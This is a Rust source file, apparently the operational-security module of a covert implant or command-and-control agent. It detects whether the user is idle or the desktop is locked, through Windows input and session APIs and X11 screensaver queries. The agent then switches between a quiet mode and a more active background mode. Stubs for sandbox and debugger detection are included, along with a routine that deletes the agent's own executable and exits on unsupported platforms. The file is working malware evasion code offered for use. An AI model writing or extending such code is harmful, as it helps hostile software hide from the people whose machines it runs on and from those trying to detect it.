use log::{debug, warn};
use std::process;
use std::time::Instant;

// Opsec mode per default on High risk to ensure maximum security.
// This module is responsible for detecting the current opsec level based on user activity and system state.
// In short, this ensure the agent to be highly paranoid.

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OpsecLevel {
    High, // High risk, user present/active or unknown
    Low,  // Low risk, user idle/locked and checks passed
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AgentMode {
    FullOpsec,      // User active, agent is quiet
    BackgroundOpsec // User idle/locked, agent can be more active
}

pub struct OpsecState {
    pub mode: AgentMode,
    pub last_transition: std::time::Instant,
}

pub fn detect_opsec_level() -> OpsecLevel {
    #[cfg(target_os = "windows")]
    {
        let idle = is_user_idle_windows();
        if idle {
            debug!("[OPSEC] All user presence checks passed: switching to Low Opsec.");
            OpsecLevel::Low
        } else {
            debug!("[OPSEC] User is present or checks failed: staying in High Opsec.");
            OpsecLevel::High
        }
    }
    #[cfg(target_os = "linux")]
    {
        let idle = is_user_idle_linux();
        if idle {
            debug!("[OPSEC] Linux X11 idle detected: switching to Low Opsec.");
            OpsecLevel::Low
        } else {
            debug!("[OPSEC] Linux X11 user present or check failed: staying in High Opsec.");
            OpsecLevel::High
        }
    }
    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
    {
        debug!("[OPSEC] Unsupported platform detected. Self-deleting and exiting.");
        self_delete_and_exit();
    }
}

pub fn determine_agent_mode() -> AgentMode {
    match detect_opsec_level() {
        OpsecLevel::High => AgentMode::FullOpsec,
        OpsecLevel::Low => AgentMode::BackgroundOpsec,
    }
}

#[cfg(target_os = "windows")]
fn is_user_idle_windows() -> bool {
    use std::ptr;
    use winapi::um::winuser::{GetLastInputInfo, LASTINPUTINFO, GetForegroundWindow};
    use winapi::um::winuser::OpenInputDesktop;
    use winapi::um::wtsapi32::{WTSQuerySessionInformationW, WTS_CURRENT_SESSION, WTSConnectStateClass, WTSActive};
    use winapi::shared::minwindef::{DWORD, FALSE};

    // 1. Check idle time
    unsafe {
        let mut lii = LASTINPUTINFO {
            cbSize: std::mem::size_of::<LASTINPUTINFO>() as u32,
            dwTime: 0,
        };
        if GetLastInputInfo(&mut lii) != 0 {
            let tick_count = winapi::um::sysinfoapi::GetTickCount();
            let idle_time = tick_count - lii.dwTime;
            debug!("[OPSEC] Idle time: {} ms", idle_time);
            // Only consider idle if more than 5 minutes
            if idle_time <= 5 * 60 * 1000 {
                debug!("[OPSEC] User not idle (idle_time <= 5min).");
                return false;
            }
        } else {
            warn!("[OPSEC] GetLastInputInfo failed, assuming High Opsec.");
            return false;
        }
    }

    // 2. Check if desktop is locked
    unsafe {
        let hdesk = OpenInputDesktop(0, FALSE, 0x0100); // GENERIC_READ
        if hdesk.is_null() {
            debug!("[OPSEC] Desktop is locked or inaccessible.");
            return true;
        }
        debug!("[OPSEC] Desktop is unlocked.");
        // Optionally: CloseHandle(hdesk);
    }

    // 3. Check session state
    unsafe {
        let mut state: *mut WTSConnectStateClass = ptr::null_mut();
        let mut bytes_returned: DWORD = 0;
        let result = WTSQuerySessionInformationW(
            ptr::null_mut(),
            WTS_CURRENT_SESSION,
            0, // WTSConnectState
            &mut state as *mut _ as *mut _,
            &mut bytes_returned,
        );
        if result != 0 && !state.is_null() {
            debug!("[OPSEC] Session state: {:?}", *state);
            if *state != WTSActive {
                debug!("[OPSEC] Session is not active.");
                return true;
            }
        } else {
            warn!("[OPSEC] WTSQuerySessionInformationW failed or state is null.");
        }
    }

    // 4. Foreground window (optional, for extra paranoia)
    unsafe {
        let fg_window = GetForegroundWindow();
        if fg_window.is_null() {
            debug!("[OPSEC] No foreground window detected.");
            return true;
        }
        debug!("[OPSEC] Foreground window present.");
    }

    // If all checks indicate idle/locked, return true (Low Opsec)
    debug!("[OPSEC] All checks indicate user is present or active.");
    false
}

#[cfg(not(target_os = "windows"))]
fn is_user_idle_windows() -> bool {
    debug!("[OPSEC] is_user_idle_windows() called on non-Windows platform.");
    false
}

#[cfg(target_os = "linux")]
fn is_user_idle_linux() -> bool {
    use log::warn;
    use std::ffi::CString;
    use std::ptr;
    use std::time::Duration;

    // Dynamically load X11 and Xss libraries
    unsafe {
        let display = (libc::dlopen)(b"libX11.so.6\0".as_ptr() as *const _, libc::RTLD_LAZY);
        if display.is_null() {
            warn!("[OPSEC] Could not load libX11.so.6");
            return false;
        }
        let xopen_display: extern "C" fn(*const i8) -> *mut libc::c_void =
            std::mem::transmute(libc::dlsym(display, b"XOpenDisplay\0".as_ptr() as *const _));
        let xss_query_info: extern "C" fn(*mut libc::c_void, libc::c_ulong, *mut libc::c_void) -> libc::c_int =
            std::mem::transmute(libc::dlsym(display, b"XScreenSaverQueryInfo\0".as_ptr() as *const _));
        let xdefault_root_window: extern "C" fn(*mut libc::c_void) -> libc::c_ulong =
            std::mem::transmute(libc::dlsym(display, b"XDefaultRootWindow\0".as_ptr() as *const _));

        let dpy = xopen_display(ptr::null());
        if dpy.is_null() {
            warn!("[OPSEC] XOpenDisplay failed");
            return false;
        }
        let root = xdefault_root_window(dpy);

        #[repr(C)]
        struct XScreenSaverInfo {
            window: libc::c_ulong,
            state: libc::c_int,
            kind: libc::c_int,
            til_or_since: libc::c_ulong,
            idle: libc::c_ulong,
            event_mask: libc::c_ulong,
        }
        let mut info = XScreenSaverInfo {
            window: 0,
            state: 0,
            kind: 0,
            til_or_since: 0,
            idle: 0,
            event_mask: 0,
        };
        let res = xss_query_info(dpy, root, &mut info as *mut _ as *mut libc::c_void);
        if res == 0 {
            warn!("[OPSEC] XScreenSaverQueryInfo failed");
            return false;
        }
        // Consider idle if more than 5 minutes (300000 ms)
        if info.idle > 300_000 {
            debug!("[OPSEC] X11 idle time: {} ms (user idle)", info.idle);
            return true;
        } else {
            debug!("[OPSEC] X11 idle time: {} ms (user active)", info.idle);
            return false;
        }
    }
}

pub fn is_sandboxed() -> bool {
    // TODO: Implement sandbox detection
    false
}

pub fn is_debugged() -> bool {
    // TODO: Implement debugger detection
    false
}

// Self delete and exit
pub fn self_delete_and_exit() -> ! {
    use std::env;
    use std::fs;

    if let Ok(path) = env::current_exe() {
        let _ = fs::remove_file(&path);
    }
    process::exit(0);
}